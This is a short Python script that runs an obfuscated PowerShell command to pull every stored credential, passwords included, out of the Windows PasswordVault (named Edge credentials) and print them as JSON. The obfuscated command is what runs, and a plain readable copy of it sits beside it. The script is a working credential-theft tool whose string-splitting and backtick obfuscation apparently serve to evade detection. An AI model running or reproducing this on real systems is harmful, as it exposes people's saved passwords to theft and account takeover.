from subprocess import check_output
from json import loads, dumps

edge_credentials = {}
d = r"""[CmdletBinding()] Param ()
${ClAs`SHO`l`dEr} = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
${va`U`LToBJ} = .("{1}{0}{2}" -f ("{1}{0}" -f 'obje','-'),'new','ct') ("{5}{9}{8}{7}{4}{3}{1}{0}{2}{6}"-f ("{1}{0}{3}{2}"-f 's','ntial','w','.Pass'),("{1}{0}" -f 'e','red'),("{0}{1}" -f'o','rdV'),("{1}{0}" -f 'y.C','it'),'ur','W',("{1}{0}"-f 'ult','a'),("{0}{1}"-f 's.Se','c'),'dow','in')
${v`AuL`Tobj}.("{1}{2}{0}{3}" -f 'A','Ret',("{0}{1}"-f 'ri','eve'),'ll')."Inv`Oke"() | .("{0}{1}{2}"-f 'f',("{0}{1}"-f 'o','reac'),'h') { ${_}.("{0}{1}{4}{3}{2}"-f("{1}{0}"-f'r','Ret'),("{2}{1}{0}"-f'Pa','ve','ie'),'rd','swo','s')."I`NVo`kE"(); ${_} } | .("{1}{2}{3}{0}" -f ("{0}{1}"-f'To','-Json'),'C','onv','ert')"""
get_edge_credentials = """[CmdletBinding()] Param ()
$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ } | ConvertTo-Json"""

a = loads(check_output(["powershell.exe", d]).decode())
b = dumps(a, indent=4)
print(b)
#a = json.dumps(a, indent=3)